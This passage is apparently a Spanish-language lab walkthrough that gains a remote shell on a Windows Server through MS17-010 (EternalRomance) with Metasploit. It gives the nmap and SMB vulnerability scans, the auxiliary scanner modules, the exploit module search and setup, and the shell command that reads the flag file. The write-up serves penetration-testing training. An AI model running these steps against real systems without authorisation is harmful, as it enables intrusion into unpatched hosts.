4. **Módulos interactuables**: Auxiliary, Exploits, Post
5. **set vs setg**: Temporal vs permanente
6. **RHOSTS**: Objetivo remoto
7. **LHOST**: Nuestra IP (para reverse shells)
8. **show options**: Verificar configuración antes de ejecutar
9. **info**: Obtener detalles completos del módulo
10. **Metasploit = Herramienta de apoyo**, no sustituto de habilidades

---


# Preguntas


#### Utilice Metasploit Framework para explotar el objetivo con EternalRomance. Busque el archivo flag.txt en el escritorio del administrador y envíe su contenido como respuesta.


Enviamos una traza `icmp` para verificar que el host está activo:

```bash
ping -c 1 <ip>
```

<img width="762" height="222" alt="image" src="https://github.com/user-attachments/assets/8947a284-db04-4efb-8eb6-048bad3055b3" />

Enviamos un escaneo con nmap para conocer versión de smb y sistema operativo:

```bash
nmap -p445 -sV -O -Pn --reason <ip>
```

Obtenemos como resultado que el puerto 445 está abierto y corre microsoft-ds `Microsoft Windows Server 2008 R2 - 2012 microsoft-ds`

Por lo que el banner ya nos está dando una idea de la versión del sistema operativo: `Microsoft Windows Server 2008 R2 - 2012`


<img width="1361" height="453" alt="image" src="https://github.com/user-attachments/assets/56a4993d-cfbb-4e60-abd6-0fa1ba21ed48" />



Buscamos todos los scripts de nmap correspondientes a smb:
```bash
find / -type f -name smb* 2>/dev/null |grep scripts
```
<img width="728" height="812" alt="image" src="https://github.com/user-attachments/assets/d91e1cfd-d5f3-4495-9a15-d7554beee65e" />

Obtenemos un montón de scripts disponibles, los que más nos interesan son:

```
smb-os-discovery
smb-vuln-ms17-010
```

Hacemos un escaneo con nmap utilizando esos scripts, para ver si es vulnerable a eternal romance:  

```bash
nmap -p445 -sV --script=smb-os-discovery,smb-vuln-ms17-010,smb-protocols <ip>
```

<img width="1165" height="832" alt="image" src="https://github.com/user-attachments/assets/f0853fae-3bee-41f6-a1fd-0447d1ee51e4" />


Descubrió que es un Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)

Descubrió otros datos de dominio muy interesantes.

A su vez, chequeamos que es altamente probable que sea vulnerable a eternal romance. Ademas vemos que utiliza la versión SMB v1 que es vulnerable.


Pasamos a metasploit ejecutando `msfconsole -q`.

Buscamos para la fase de reconocimiento de la siguiente manera:
```bash
search type:auxiliary discovery
```
<img width="1765" height="808" alt="image" src="https://github.com/user-attachments/assets/7137079a-fa5f-4be7-b20a-c8dba8aef986" />


Pordríamos usar este módulo auxiliar para reconocer los hosts activos en la red local mediante arp discovery.


Ahora buscamos portscan:
```bash
search type:auxiliary portscan
```
<img width="1343" height="401" alt="image" src="https://github.com/user-attachments/assets/d43f8ce0-f581-4692-aefd-a1ecd529dcb9" />


Usamos `auxiliary/scanner/portscan/tcp`.

Configuramos el RHOSTS con la ip víctima, utilizando el comando setg.


Configuramos PORTS para que escanee sólo los primeros 600 puertos:
```bash
set PORTS 445
```
Ejecutamos:
<img width="1547" height="579" alt="image" src="https://github.com/user-attachments/assets/ee465d37-85df-472a-80a0-a34c328410b4" />

Buscamos todos los scanners smb:
```
search type:auxiliary path:scanner/smb
```
<img width="1685" height="629" alt="image" src="https://github.com/user-attachments/assets/9b14a95b-a2df-4bf1-8eb6-02ed3487fcba" />

Usamos `auxiliary/scanner/smb/smb_version`

Corremos:

<img width="1895" height="467" alt="image" src="https://github.com/user-attachments/assets/9fa12fdd-ebfe-4054-9679-599f06a27547" />


Obtenemos una información similar a los escaneos con nmap.


Usamos `auxiliary/scanner/smb/smb_ms17_010` para chequear si es vulnerable a eternal romance o eternal blue:

<img width="1918" height="597" alt="image" src="https://github.com/user-attachments/assets/5ad96a23-8470-40d6-8170-8ac3ec6225cd" />

Observamos que la herramienta nos dice `Host is likely VULNERABLE to MS17_010`.

Por lo que procedemos a buscar un exploit:

```bash
search type:exploit eternalromance plarform:windows
```
<img width="1782" height="471" alt="image" src="https://github.com/user-attachments/assets/ad2c0a28-126c-4dcc-9e16-e37f40f4f7a2" />

Usamos `exploit/windows/smb/smb17_010_psexec`

Vemos que está todo configurado, pero tenemos que cambiar nuestra ip por la de tun0:
<img width="1907" height="829" alt="image" src="https://github.com/user-attachments/assets/351302d4-4a16-4b45-bb96-82042c2d07af" />


Si hacemos `check` vemos que utiliza el scanner que utilizamos recién:
<img width="1221" height="136" alt="image" src="https://github.com/user-attachments/assets/5c08a399-5d33-4bcf-a75f-56ea6d9d171a" />


Explotamos:
<img width="1475" height="578" alt="image" src="https://github.com/user-attachments/assets/f43e8b58-3659-45c9-9b42-c341dc8d6209" />

Vemos que tenemos un problema con el timeout.

`Nota`: El problema se soluciona cuando nuestro kali deja de estar en NAT y lo configuramos como adaptador puente. Esto puede pasar a veces.

<img width="1913" height="512" alt="image" src="https://github.com/user-attachments/assets/e088fac7-fe7a-4d3d-ade1-01e2ce80bc72" />


Ejecutamos `shell` y leemos la flag:
```bash
type C:\Users\Administrator\Desktop\fñag.txt
```

<img width="836" height="407" alt="image" src="https://github.com/user-attachments/assets/2d80acc3-be82-4a31-b602-70d0e364cfe6" />
